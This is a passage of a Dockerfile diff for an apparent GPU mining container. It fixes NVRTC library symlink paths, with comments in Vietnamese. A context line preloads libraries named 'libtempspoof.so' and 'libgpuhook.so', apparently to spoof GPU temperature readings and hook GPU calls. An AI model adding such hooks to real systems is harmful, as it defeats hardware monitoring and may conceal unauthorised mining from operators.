@@ -176,29 +176,41 @@ ENV SCRIPT_DIR=/app/mining_environment/scripts \
 # Simplified CUDA library path - production only
 ENV LD_LIBRARY_PATH=/usr/local/cuda/lib64:$LD_LIBRARY_PATH
 
-# ------------------  NVRTC Symbolic Link Fix (Nhánh A) ---------------------
-# Fix: Tạo symbolic link cho libnvrtc-builtins.so.12.0 → libnvrtc-builtins.so.12.0.140
-# Nguyên nhân: Mining application yêu cầu version 12.0 nhưng CUDA 12.0 image có 12.0.140
+# ------------------  NVRTC Symbolic Link Fix (Corrected Path) ---------------------
+# Fix: Tạo symbolic link cho libnvrtc-builtins.so.12.0 → actual file location
+# Nguyên nhân: NVRTC tìm file trong /usr/lib/x86_64-linux-gnu/ nhưng file thực tế ở /usr/local/cuda-12.0/targets/x86_64-linux/lib/
 RUN set -eux; \
     echo "🔧 [NVRTC-BUILD-FIX] Checking and creating NVRTC symbolic links..."; \
-    # Kiểm tra và tạo symbolic link cho NVRTC builtins library nếu cần
-    if [ -f "/usr/local/cuda/lib64/libnvrtc-builtins.so.12.0.140" ] && [ ! -f "/usr/local/cuda/lib64/libnvrtc-builtins.so.12.0" ]; then \
-        echo "[NVRTC-BUILD-FIX] Creating symbolic link: libnvrtc-builtins.so.12.0 -> libnvrtc-builtins.so.12.0.140"; \
-        cd /usr/local/cuda/lib64 && \
-        ln -sf libnvrtc-builtins.so.12.0.140 libnvrtc-builtins.so.12.0; \
+    # Định vị file NVRTC builtins thực tế
+    NVRTC_ACTUAL_PATH="/usr/local/cuda-12.0/targets/x86_64-linux/lib/libnvrtc-builtins.so.12.0.140"; \
+    NVRTC_FALLBACK_PATH="/usr/local/cuda/targets/x86_64-linux/lib/libnvrtc-builtins.so.12.0.140"; \
+    # Xác định đường dẫn chính xác
+    if [ -f "$NVRTC_ACTUAL_PATH" ]; then \
+        NVRTC_SOURCE="$NVRTC_ACTUAL_PATH"; \
+        echo "[NVRTC-BUILD-FIX] Found NVRTC library at: $NVRTC_SOURCE"; \
+    elif [ -f "$NVRTC_FALLBACK_PATH" ]; then \
+        NVRTC_SOURCE="$NVRTC_FALLBACK_PATH"; \
+        echo "[NVRTC-BUILD-FIX] Using fallback path: $NVRTC_SOURCE"; \
+    else \
+        echo "[NVRTC-BUILD-FIX] ❌ NVRTC library not found in expected locations"; \
+        exit 1; \
     fi; \
-    # Tạo system-wide symlink để đảm bảo compatibility
-    if [ -f "/usr/local/cuda/lib64/libnvrtc-builtins.so.12.0.140" ]; then \
-        echo "[NVRTC-BUILD-FIX] Creating system-wide symbolic link"; \
-        mkdir -p /usr/lib/x86_64-linux-gnu && \
-        ln -sf /usr/local/cuda/lib64/libnvrtc-builtins.so.12.0.140 /usr/lib/x86_64-linux-gnu/libnvrtc-builtins.so.12.0; \
-    fi; \
+    # Tạo system-wide symbolic link trỏ đến file thực tế
+    echo "[NVRTC-BUILD-FIX] Creating system-wide symbolic link"; \
+    mkdir -p /usr/lib/x86_64-linux-gnu && \
+    ln -sf "$NVRTC_SOURCE" /usr/lib/x86_64-linux-gnu/libnvrtc-builtins.so.12.0; \
+    # Tạo thêm symbolic link trong /usr/local/cuda/lib64 để compatibility
+    mkdir -p /usr/local/cuda/lib64 && \
+    ln -sf "$NVRTC_SOURCE" /usr/local/cuda/lib64/libnvrtc-builtins.so.12.0.140 && \
+    ln -sf libnvrtc-builtins.so.12.0.140 /usr/local/cuda/lib64/libnvrtc-builtins.so.12.0; \
     # Cập nhật ldconfig cache
     ldconfig 2>/dev/null || echo "[NVRTC-BUILD-FIX] ldconfig update skipped"; \
     # Verification - kiểm tra symbolic link được tạo thành công
     echo "[NVRTC-BUILD-FIX] Verification:"; \
-    ls -la /usr/local/cuda/lib64/libnvrtc-builtins.so.12.0* || echo "No NVRTC builtins found"; \
-    echo "✅ [NVRTC-BUILD-FIX] Build-time fix completed"
+    ls -la /usr/lib/x86_64-linux-gnu/libnvrtc-builtins.so.12.0; \
+    ls -la /usr/local/cuda/lib64/libnvrtc-builtins.so.12.0* 2>/dev/null || echo "CUDA lib64 links optional"; \
+    readlink /usr/lib/x86_64-linux-gnu/libnvrtc-builtins.so.12.0; \
+    echo "✅ [NVRTC-BUILD-FIX] Build-time fix completed with correct paths"
 
 ENV LD_PRELOAD="/opt/hooks/libtempspoof.so:/opt/hooks/libgpuhook.so"
 
